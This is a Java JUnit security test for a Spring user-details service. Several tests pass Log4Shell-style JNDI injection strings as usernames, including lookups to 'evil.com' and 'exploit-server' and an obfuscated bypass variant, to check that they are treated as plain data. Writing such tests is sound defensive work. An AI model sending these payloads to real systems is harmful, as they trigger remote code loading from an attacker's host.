package com.contrast.frontgateservice.service;

import com.contrast.frontgateservice.entity.User;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
class CustomUserDetailsServiceSecurityTest {

    @Mock
    private UserService userService;

    @InjectMocks
    private CustomUserDetailsService customUserDetailsService;

    private User testUser;

    @BeforeEach
    void setUp() {
        testUser = new User();
        testUser.setId(1L);
        testUser.setUsername("testuser");
        testUser.setPassword("encodedPassword");
        testUser.setEnabled(true);
    }

    @Test
    void testLoadUserByUsername_WithJNDIInjectionAttempt_ShouldNotExecuteJNDILookup() {
        String maliciousUsername = "${jndi:ldap://exploit-server:1389/serial/CommonsCollections2}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);

        UserDetails result = customUserDetailsService.loadUserByUsername(maliciousUsername);

        assertNotNull(result);
        assertEquals("testuser", result.getUsername());
        verify(userService, times(1)).findByUsername(maliciousUsername);
    }

    @Test
    void testLoadUserByUsername_WithVariousJNDIPatterns_ShouldHandleSafely() {
        String[] maliciousPatterns = {
            "${jndi:ldap://evil.com/a}",
            "${jndi:rmi://evil.com/obj}",
            "${jndi:dns://evil.com}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
            "user${jndi:ldap://evil.com}name"
        };

        for (String pattern : maliciousPatterns) {
            when(userService.findByUsername(pattern)).thenReturn(testUser);
            
            UserDetails result = customUserDetailsService.loadUserByUsername(pattern);
            
            assertNotNull(result);
            assertEquals("testuser", result.getUsername());
        }
    }

    @Test
    void testLoadUserByUsername_WithNormalUsername_ShouldWorkCorrectly() {
        String normalUsername = "normaluser";
        
        when(userService.findByUsername(normalUsername)).thenReturn(testUser);

        UserDetails result = customUserDetailsService.loadUserByUsername(normalUsername);

        assertNotNull(result);
        assertEquals("testuser", result.getUsername());
        assertEquals("encodedPassword", result.getPassword());
        assertTrue(result.isEnabled());
        verify(userService, times(1)).findByUsername(normalUsername);
    }

    @Test
    void testLoadUserByUsername_WithNonExistentUser_ShouldThrowException() {
        String username = "nonexistent";
        
        when(userService.findByUsername(username)).thenReturn(null);

        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(username);
        });
        
        verify(userService, times(1)).findByUsername(username);
    }

    @Test
    void testLoadUserByUsername_WithDisabledUser_ShouldReturnDisabledUserDetails() {
        String username = "disableduser";
        User disabledUser = new User();
        disabledUser.setId(2L);
        disabledUser.setUsername("disableduser");
        disabledUser.setPassword("encodedPassword");
        disabledUser.setEnabled(false);
        
        when(userService.findByUsername(username)).thenReturn(disabledUser);

        UserDetails result = customUserDetailsService.loadUserByUsername(username);

        assertNotNull(result);
        assertEquals("disableduser", result.getUsername());
        assertFalse(result.isEnabled());
        verify(userService, times(1)).findByUsername(username);
    }

    @Test
    void testLoadUserByUsername_WithSpecialCharacters_ShouldHandleCorrectly() {
        String usernameWithSpecialChars = "user@example.com";
        
        when(userService.findByUsername(usernameWithSpecialChars)).thenReturn(testUser);

        UserDetails result = customUserDetailsService.loadUserByUsername(usernameWithSpecialChars);

        assertNotNull(result);
        assertEquals("testuser", result.getUsername());
        verify(userService, times(1)).findByUsername(usernameWithSpecialChars);
    }
}
